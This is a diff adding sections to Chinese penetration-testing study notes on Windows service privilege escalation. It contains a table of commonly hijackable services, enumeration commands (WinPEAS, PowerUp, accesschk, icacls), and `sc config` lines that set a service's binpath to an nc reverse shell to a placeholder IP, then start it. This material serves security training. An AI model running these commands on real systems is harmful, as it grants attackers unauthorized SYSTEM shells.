@@ -76,6 +76,16 @@ SERVICE_START_NAME：用哪个账号跑（LocalSystem最值钱）
 
 START_TYPE：auto还是demand（影响触发方式）
 
+## 常用服务
+
+| **服务类型**           | **常见服务名称**                                             | **劫持方式**                                  | **为什么常见？**                                             |
+| ---------------------- | ------------------------------------------------------------ | --------------------------------------------- | ------------------------------------------------------------ |
+| **UPnP / SSDP 服务**   | upnphost SSDPSRV                                             | 弱权限（SERVICE_ALL_ACCESS 或 CHANGE_CONFIG） | 老版本 Windows（如 Win7/2008）默认弱权限，Authenticated Users 可改 binpath。经典示例：用 `sc config upnphost binpath= "nc.exe -e cmd IP PORT"` |
+| **卷影复制服务**       | VSS (Volume Shadow Copy)                                     | 弱权限或可写路径                              | 如你之前例子，常以 SYSTEM 运行，非关键服务，易修改 binpath（即使 start 报 1053 错误，payload 已执行）。 |
+| **其他经典弱权限服务** | dakeyboard AudioSrv McShield                                 | 可替换二进制或改 binpath                      | 第三方软件（如旧版 McAfee、键盘驱动）常给 Everyone Full Control。 |
+| **无引号路径常见服务** | 第三方如： "C:\Program Files\Some App\Service.exe" 常见路径：C:\Program Files... | 在空格中间目录放恶意 exe（如 C:\Program.exe） | 安装程序未加引号，常见于自定义服务。检查命令：`wmic service get name,pathname |
+| **AD/域环境额外**      | BITS wuauserv ikeext                                         | DLL 劫持或弱注册表权限                        | 附件 "goadv2.pdf" 和 AD 笔记中常见，用于域提权。             |
+
 ## 如何判断我有没有权限动它？
 
 icacls "C:\Path\to\service.exe"
@@ -181,3 +191,23 @@ STATE : 4  RUNNING
 | -------- | ------ |
 | sc qc    | 配置   |
 | sc query | 状态   |
+
+## 自动化枚举工具
+
+用 **WinPEAS.exe**（强烈推荐，附件 Cheat Sheet 如 "OSCP_Cheat_Sheet_-_Thor-Sec.pdf" 提到）：运行 winpeas.exe quiet servicesinfo，它会高亮 "YOU CAN MODIFY THIS SERVICE" 或 "Unquoted Service Path"。
+
+用 **PowerUp.ps1**：Invoke-AllChecks，列出 ModifiableServices。
+
+## 手动
+
+1)sc qc <服务名> 检查 binpath 和权限
+
+2)accesschk.exe -ucqv <服务名> 检查 CHANGE_CONFIG 权限
+
+accesschk.exe -uwcqv "Authenticated Users" *
+
+icacls "C:\path\to\service.exe"
+
+sc config <服务名> binpath= "C:\ProgramData\nc64.exe -e cmd.exe YOUR_IP 443"
+
+sc start <服务名>
